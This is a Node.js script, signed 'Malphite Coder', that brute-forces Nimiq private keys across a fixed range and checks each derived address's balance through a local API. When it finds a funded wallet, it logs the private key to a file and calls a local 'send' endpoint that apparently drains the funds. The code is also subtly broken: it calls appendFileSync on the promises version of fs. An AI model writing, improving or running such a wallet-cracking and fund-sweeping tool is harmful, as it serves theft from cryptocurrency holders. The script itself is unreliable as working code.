const fs = require("fs").promises;
const Wallet = require('./wallet');
const { default: axios } = require('axios');

(async () => {
  const send = async (privateKey) => {
    try {
      const res = await axios.get(`http://127.0.0.1:8088/api/v1/send/${privateKey}`)
      return res.data;
    } catch (error) {
      return null;
    }
  }

  const getBalance = async (address) => {
    try {
      const res = await axios.get(`http://127.0.0.1:8088/api/v1/balance/${address}`)
      return res.data.balance;
    } catch (error) {
      console.log(error);
      return -1;
    }
  }

  const MIN_PRIVATE_KEY = BigInt(`0xe${"0".repeat(63)}`);
  const MAX_PRIVATE_KEY = BigInt(`0xf${"F".repeat(63)}`);
  const BATCH_SIZE = 500; // Adjust batch size as needed
  let founds = 0;

  const processBatch = async (startKey, endKey) => {
    const promises = [];
    for (let key = startKey; key <= endKey; key++) {
      const privateKeyHex = key.toString(16).padStart(64, "0");
      const wallet = Wallet.fromPrivateKey(privateKeyHex)
      const address = wallet.getAddress();

      promises.push(
        getBalance(address).then(async (balance) => {
          if (balance > 0) {
            founds++;
            const successString = `Wallet: [${address}] - Private: [${privateKeyHex}] - Balance: ${balance} NIM\n\n------ Malphite Coder ------\n\n`;
            fs.appendFileSync('./match-private.txt', successString, (err) => console.error(err));
            await send(privateKeyHex);
          }
          console.log(`\x1b[34mFounds: ${founds} | Wallet Check : ${address} | ${privateKeyHex} | ${balance} NIM\x1b[0m`);
        })
      );
    }
    await Promise.all(promises);
  };

  for (let startKey = MIN_PRIVATE_KEY; startKey <= MAX_PRIVATE_KEY; startKey += BigInt(BATCH_SIZE)) {
    const endKey = startKey + BigInt(BATCH_SIZE) - BigInt(1);
    await processBatch(startKey, endKey < MAX_PRIVATE_KEY ? endKey : MAX_PRIVATE_KEY);
  }
})();
